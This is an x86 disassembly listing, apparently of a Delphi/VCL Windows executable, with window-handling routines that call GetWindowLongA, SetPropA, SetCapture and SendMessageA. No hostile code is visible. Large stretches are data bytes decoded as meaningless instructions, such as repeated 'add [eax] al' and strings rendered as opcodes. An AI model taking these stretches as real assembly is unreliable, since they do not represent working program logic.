jo r-xdata
fdivr [ eax ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x39 ] bl
inc ebx
jns r-xdata
or [ ebx + 0x6f ] al
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx + edi ] ch
inc ebx
add [ esi ] al
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ eax + 0x39 ] dh
inc ebx
outsb
imul ecx [ ebx + 0x433974c0 ] 0x0
add ecx [ eax ]
push esp
dec ecx
insd
add [ ecx + edi ] cl
inc esp
add [ eax - 0x17ffbc64 ] cl
inc ebx
add [ esi + 0x395c0043 ] ah
inc esp
add [ eax + 0x39 ] dh
inc esp
add ah bl
inc bx
add [ eax + 0x38004439 ] bl
inc ebx
add [ eax + 0x58004439 ] ah
inc ebx
add [ eax - 0x6fffbbc7 ] ch
pushfd
inc ebx
add [ eax + ebp * 2 + 0x43 ] cl
add [ eax + ebp * 2 + 0x67780043 ] cl
inc ebx
add [ ecx + edi + 0x39c00044 ] bh
inc esp
add [ edi + 0x650c0043 ] bl
inc ebx
add [ 0x6e695754 ] dl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax + eax ] ah
add [ eax ] al
push eax
sub [ ebx ] eax
les esi [ eax + eax * 2 ]
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
lodsb [ gs : esi ]
adc [ eax ] al
push esp
add [ eax ] eax
[ eax ]
adc [ eax ] eax
outsd
insb
jae r-xdata
add [ esi ] al
jb r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
cmp al [ ebx ]
add ecx [ edx ]
push esp
inc edx
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ edx + edi + 0x43 ] dh
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
cmp al [ ebx ]
push es
push ebx
dec eax
popad
outsb
jne r-xdata
or ch [ ecx + 0x6d ]
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax + 0x5400439c ] bl
in eax 0x43
add [ eax - 0x16 ] dh
inc ebx
add [ ecx + ebp * 8 + 0x6af00043 ] bh
inc ebx
add [ eax ] dl
inc ebx
add [ eax ] dh
inc ebx
add [ ebp + ebx * 8 + 0x43 ] cl
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax - 0x66 ] dl
inc ebx
add [ edx + ebx * 4 + 0x43 ] bh
add [ ebp + esi * 2 + 0x43 ] bh
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add [ eax - 0x6bffbc8a ] al
jns r-xdata
outsd
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
cmp al [ ebx ]
push es
inc eax
add [ ecx ] al
jns r-xdata
insb
inc ebp
jae r-xdata
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ fs : edx + 0x76 ] ah
add [ edx + edi + 0x43 ] esi
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
outsb
popad
jb r-xdata
outsd
insd
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add al dl
cmp al [ ebx ]
push es
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
inc ebx
add [ eax + 0x500043df ] al
mov ebp 0xf1100043
inc ebx
add ah bh
fild [ ebx ]
in al dx
fiadd [ ebx ]
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + edi ] dl
inc ebx
add [ ecx + eax ] bh
add [ eax ] al
cmp al [ ebx ]
mov [ ecx ] al
add [ eax ] al
imul eax [ eax ] 0x111000f
dec esi
add [ 0x15011400 ] dl
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add [ eax + 0x78 ] al
inc ebx
add [ eax - 0x3fffbc47 ] al
0xdda00043 0x43
pop esp
fiadd [ ebx ]
pop eax
fld [ ebx ]
inc eax
fiadd [ ebx ]
fcomp [ edi - 0x5993ffbd ]
inc ebx
add [ esp + esi * 4 ] cl
inc ebx
add al bh
lodsd [ esi ]
inc ebx
add ah dh
mov al 0x43
add [ edi + ebp * 4 ] ah
inc ebx
add [ esp + esi * 4 - 0x4b57ffbd ] ah
inc ebx
add [ eax - 0x4d ] ah
inc ebx
add [ eax ] cl
mov bl 0x43
add [ eax ] al
add [ eax ] al
pop esp
cmp al 0x43
add bh bh
call [ ebx + edi + 0x43 ]
add [ eax ] al
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
cmp al [ ebx ]
mov eax eax
aam 0x3a
inc ebx
je r-xdata
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
inc edx
outsd
jb r-xdata
rol [ edx + edi ] 0x43
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
add [ eax ] al
aas
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x3c ] dh
inc ebx
add dh ch
inc ebx
add [ edx + eax ] al
add [ eax ] al
xor [ ebx + eax * 2 ] 0x0
mov ah 0xb0
inc ecx
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
add [ esp + edi + 0x43 ] bl
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ ebx + 0x433ad4c0 ] cl
inc ebx
mov al 0x41
insb
jae r-xdata
dec esi
popad
insd
mov eax eax
adc al 0x3a
inc ebx
add [ ecx ] al
or al 0x54
or cl [ eax ]
push esp
dec ecx
insd
js r-xdata
xor al 0x40
add ah ah
mov edx 0x322c0043
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebp + ebx * 4 - 0x15bfffbd ] bh
inc ebx
add [ edx + esi * 4 + 0x476c0043 ] ch
inc ecx
add [ eax + 0x7c004398 ] al
insb
inc ebx
add [ eax - 0x61 ] ah
inc ebx
add [ ebp + esi * 2 - 0x4f33ffbd ] dl
inc ecx
outsd
insb
jae r-xdata
mov eax eax
sbb [ ebx ] bh
outsb
je r-xdata
inc ebx
outsd
outsb
je r-xdata
inc ebx
outsd
inc ebx
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
inc ebx
add [ edi ] cl
or al 0x49
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
rcr [ eax ] 0x3b
sub_433d64
inc ebx
add [ ebx + eax * 8 + 0x43 ] dl
add [ eax - 0x3d ] bh
inc ebx
add [ ebx + eax * 8 - 0x3c3fffbd ] bl
inc ebx
add [ eax - 0x3c ] cl
inc ebx
add [ eax ] cl
lds eax [ ebx ]
pop eax
lds eax [ ebx ]
mov ebp es
inc ebx
add [ eax + 0x280043c5 ] ah
into
inc ebx
add [ esi + ecx * 8 + 0x43 ] dl
add [ eax ] dl
iretd
sub_433d9c
inc ebx
add [ eax + edx * 8 - 0x2eb3ffbd ] ah
inc ebx
add [ ecx + edx * 8 + 0x43 ] ch
add [ eax - 0x3fffbc2f ] ah
rol [ ebx ] 0x1
shr ah 0x1
inc ebx
add ah dh
rol [ ebx ] 0x1
adc dl dl
inc ebx
add [ eax - 0x13 ] ah
inc ebx
add [ edx + edx * 8 - 0x2d4fffbd ] cl
inc ebx
add [ edx + eax * 8 - 0x3d2fffbd ] bh
inc ebx
add al ah
retn 0x43
sub_433df7
rol [ ebx ] cl
clc
rol [ ebx ] cl
add ah dl
inc ebx
add [ eax - 0x2c ] bl
inc ebx
add [ eax - 0x37ffbc2c ] ah
aam 0x43
add [ ebp + edx * 8 + 0x43 ] al
add [ edx * 8 - 0x2a7bffbd ] al
inc ebx
add ah al
aad 0x43
add [ eax ] dh
aam 0x43
add al dl
rol [ ebx ] cl
and bl dl
inc ebx
add [ ebx + edx * 8 - 0x2c5fffbd ] dl
inc ebx
add [ esi + edx * 8 ] al
inc ebx
add [ esi + edx * 8 - 0x29f3ffbd ] dl
inc ebx
add [ esi + edx * 8 ] dl
inc ebx
add [ esi + edx * 8 ] bl
inc ebx
add [ esi + edx * 8 ] ah
inc ebx
add [ edi + edx * 8 + 0x43 ] al
add [ eax ] ch
fadd [ ebx ]
jl r-xdata
inc ebx
add [ eax + 0x40043d3 ] ah
salc
inc ebx
add al cl
fadd [ ebx ]
and al 0xd9
inc ebx
add [ eax + 0x240043d6 ] al
mov ch 0x43
add [ eax + 0x43dd ] dh
int3
sub_434200
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
inc edx
inc ebx
add [ eax ] ch
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x54090040 ] al
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_4342f0
rol [ edx + 0x43 ] 0x1
add dl bl
inc edx
inc ebx
add ah ah
inc edx
inc ebx
add [ ebp + 0x42 ] dl
inc ebx
add [ ebp + 0x42 ] bl
inc ebx
add [ ebp + 0x42 ] ah
inc ebx
add [ ebp + 0x42 ] ch
inc ebx
add [ edx + 0x42 ] bh
inc ebx
add [ edi - 0x6bffbcbe ] al
inc edx
inc ebx
add [ ecx - 0x51ffbcbe ] ah
inc edx
inc ebx
add [ ebx - 0x37ffbcbe ] bh
inc edx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x42f0e870 ] eax
inc ebx
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 2 + 0x43280043 ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
inc ebx
inc ebx
add [ eax ] bh
add [ eax ] al
lodsb [ esi ]
adc [ eax ] eax
les esi [ eax + eax * 2 ]
add [ edi + edx * 2 ] cl
inc eax
add [ eax ] bl
push edi
inc eax
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ eax ] ch
push edi
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0xbffbbfd ] ah
add eax [ eax + eax + 0x6c ]
add eax 0x57c0044
inc esp
add [ ecx + 0x10240044 ] bh
inc esp
add [ edx + edx + 0x44 ] ah
add [ eax + 0x14 ] ch
inc esp
add [ ecx + ebx + 0x44 ] ch
add [ eax ] ah
pop ss
inc esp
add [ eax ] bh
add al [ eax + eax ]
adc [ eax + eax + 0x9 ] eax
push esp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
add [ eax ] al
je r-xdata
mov eax eax
sbb [ ebx + eax * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ebx + eax * 2 ] al
sub [ eax ] al
add [ eax ] al
mov eax 0xc4004010
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ esi + 0x44 ] dl
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
add [ eax + 0x7c004398 ] al
insb
inc ebx
add [ eax - 0x61 ] ah
inc ebx
add [ ebp + esi * 2 - 0x4f33ffbd ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ebx
inc ecx
add ah dl
mov al 0x41
add [ eax + 0x5400439c ] bl
in eax 0x43
add [ eax - 0x16 ] dh
inc ebx
add [ ecx + ebp * 8 + 0x6af00043 ] bh
inc ebx
add [ eax ] dl
inc ebx
add [ eax ] dh
inc ebx
add [ ebp + ebx * 8 + 0x43 ] cl
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax - 0x66 ] dl
inc ebx
add [ edx + ebx * 4 + 0x43 ] bh
add [ ebp + esi * 2 + 0x43 ] bh
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add [ eax - 0x6bffbc8a ] al
jns r-xdata
lodsd [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + eax * 2 + 0x43 ] bl
add [ eax ] cl
add al [ eax ]
add [ eax + 0x3b ] cl
inc ebx
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah ah
mov edx 0x322c0043
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebp + ebx * 4 - 0x15bfffbd ] bh
inc ebx
add [ edx + esi * 4 + 0x476c0043 ] ch
inc ecx
nop
insb
inc esp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + eax * 2 + 0x43 ] dh
inc ebx
add [ eax + 0x500043df ] al
mov ebp 0xf1100043
inc ebx
add ah bh
fild [ ebx ]
in al dx
fiadd [ ebx ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
add [ eax + 0x78 ] al
inc ebx
add [ eax - 0x3fffbc47 ] al
0xdda00043 0x43
pop esp
fiadd [ ebx ]
pop eax
fld [ ebx ]
inc eax
fiadd [ ebx ]
fcomp [ edi - 0x5993ffbd ]
inc ebx
add [ esp + esi * 4 ] cl
inc ebx
add al bh
lodsd [ esi ]
inc ebx
add ah dh
mov al 0x43
add [ edi + ebp * 4 ] ah
inc ebx
add [ esp + esi * 4 - 0x4b57ffbd ] ah
inc ebx
add [ eax - 0x4d ] ah
inc ebx
add [ eax ] cl
mov bl 0x43
sub al 0x21
std
[ ecx + 0x40000000 ]
je r-xdata
push eax
call GetWindowLongA
test eax 0x40000000
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
je r-xdata
insb
nop
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
js r-xdata
inc ebx
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
sub eax 0x2a900044
inc eax
add [ edx ] dl
push esp
inc ebx
jne r-xdata
inc edi
add [ ebx + 0x18c80 ] cl
add [ eax + 0x6a ] dl
cld
inc ebp
or [ eax + 0x6a ] dl
hlt
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
or [ eax - 0x18 ] dl
mul [ edx ]
std
jmp [ ecx + rw-data ]
insb
insb
inc esp
inc ebx
add ah bh
inc ebx
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
outsd
insb
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
add [ ebp - 0x74aaffc0 ] cl
in al dx
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
sub_434658
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_43468c
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404510
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_434658
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_4346e8
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_4348cc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c2ac
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404570
mov eax edi
mov edx esi
call sub_4040a4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_434910
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c2ac
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404570
mov eax edi
mov edx esi
call sub_4040a4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43497c
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
jne r-xdata
mov eax ebx
call sub_43df6c
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_434a28
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_414170
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_434a5c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43df6c
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_434a84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026e4
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_434a5c
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_434a28
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414014
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4141ec
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_434ae0
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_414048
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_414170
mov edx 0x8
call sub_402704
inc esi
dec ebx
jne r-xdata
sub_434b14
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_414170
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_434a28
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_434b78
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_434bd8
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4031e4
mov edx esp
mov eax esi
call sub_4042b4
add esp 0x100
pop esi
pop ebx
retn
sub_434c14
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_434cde
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_435d34
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_4356bc
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069f0
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_4356bc
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_435d34
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_4356bc
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_435d34
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_434ce3
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_456e4c
call sub_403a84
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_435d34
sub_434d3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_434d66
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434dcc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_434b78
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_434df8
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403490
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_434e24
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403490
xor edx edx
sub_434e7c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_43f9e4
sub_434e9c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_43f9cc
sub_434ec0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_434da8
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dfdc
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_4230e8
mov edx eax
mov eax esi
call sub_41e158
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_434f24
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_434f54
push ebx
